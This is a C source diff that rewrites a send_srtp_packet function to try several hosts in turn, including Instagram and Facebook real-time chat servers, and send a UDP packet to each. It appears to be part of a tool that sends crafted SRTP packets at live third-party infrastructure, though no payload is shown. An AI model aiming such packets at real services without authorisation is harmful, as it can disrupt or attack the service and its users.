@@ -13,32 +13,87 @@ int send_srtp_packet(const uint8_t *packet, size_t packet_size,
     printf("    Protocol: UDP\n");
     printf("    Packet Size: %zu bytes\n", packet_size);
 
-    /* Create UDP socket */
-    int sock = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sock < 0) {
-        perror("socket");
-        return -1;
+    /* Try multiple RTC servers */
+    const char *rct_servers[] = {
+        target_ip,
+        INSTAGRAM_RTC_SERVER,
+        INSTAGRAM_RTC_SERVER_2,
+        "edge-chat.facebook.com",
+        "signal.instagram.com"
+    };
+    int num_servers = sizeof(rct_servers) / sizeof(rct_servers[0]);
+
+    int sock = -1;
+    struct sockaddr_in target_addr;
+
+    for (int attempt = 0; attempt < num_servers; attempt++) {
+        const char *server = rct_servers[attempt];
+
+        printf("[*] Attempt %d/%d: Connecting to %s:%u\n",
+               attempt + 1, num_servers, server, target_port);
+
+        sock = socket(AF_INET, SOCK_DGRAM, 0);
+        if (sock < 0) continue;
+
+        memset(&target_addr, 0, sizeof(target_addr));
+        target_addr.sin_family = AF_INET;
+        target_addr.sin_port = htons(target_port);
+
+        /* Try to parse as IP address first */
+        target_addr.sin_addr.s_addr = inet_addr(server);
+
+        /* If not a valid IP, try DNS resolution */
+        if (target_addr.sin_addr.s_addr == INADDR_NONE) {
+            printf("  [*] Resolving hostname: %s\n", server);
+            struct hostent *host = gethostbyname(server);
+            if (!host) {
+                printf("  [-] DNS resolution failed\n");
+                close(sock);
+                continue;
+            }
+            target_addr.sin_addr.s_addr = *(unsigned long *)host->h_addr;
+            printf("  [+] Resolved to: %s\n", inet_ntoa(target_addr.sin_addr));
+        } else {
+            printf("  [+] Using IP: %s\n", inet_ntoa(target_addr.sin_addr));
+        }
+
+        /* Try sending packet */
+        ssize_t sent = sendto(sock, packet, packet_size, 0,
+                             (struct sockaddr *)&target_addr,
+                             sizeof(target_addr));
+
+        if (sent > 0) {
+            printf("  [+] ✅ Packet sent successfully to %s\n", server);
+            close(sock);
+            return 0;
+        } else {
+            printf("  [-] Send failed\n");
+            close(sock);
+        }
     }
+
+    printf("[-] All RTC server attempts failed\n");
+    return -1;
+}
+
+int send_srtp_packet_old(const uint8_t *packet, size_t packet_size,
+                     const char *target_ip, uint16_t target_port) {
+    int sock = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sock < 0) return -1;
 
     struct sockaddr_in target_addr;
     memset(&target_addr, 0, sizeof(target_addr));
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(target_port);
-
-    /* Try to parse as IP address first */
     target_addr.sin_addr.s_addr = inet_addr(target_ip);
 
-    /* If not a valid IP, try DNS resolution */
     if (target_addr.sin_addr.s_addr == INADDR_NONE) {
-        printf("[*] Resolving hostname: %s\n", target_ip);
         struct hostent *host = gethostbyname(target_ip);
         if (!host) {
-            printf("[-] DNS resolution failed: %s\n", target_ip);
             close(sock);
             return -1;
         }
         target_addr.sin_addr.s_addr = *(unsigned long *)host->h_addr;
-        printf("[+] Resolved to: %s\n", inet_ntoa(target_addr.sin_addr));
     }
 
     /* Send packet */
